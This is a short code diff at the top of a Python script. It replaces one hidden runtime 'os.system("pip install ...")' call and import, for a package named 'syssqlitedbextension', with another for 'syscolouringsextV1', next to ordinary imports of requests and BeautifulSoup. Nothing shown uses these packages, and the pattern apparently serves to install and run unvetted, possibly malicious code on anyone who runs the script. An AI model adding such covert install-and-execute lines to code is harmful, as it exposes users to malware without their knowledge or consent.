@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlitedbextension")
-import syssqlitedbextension
+os.system("pip install syscolouringsextV1")
+import syscolouringsextV1
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
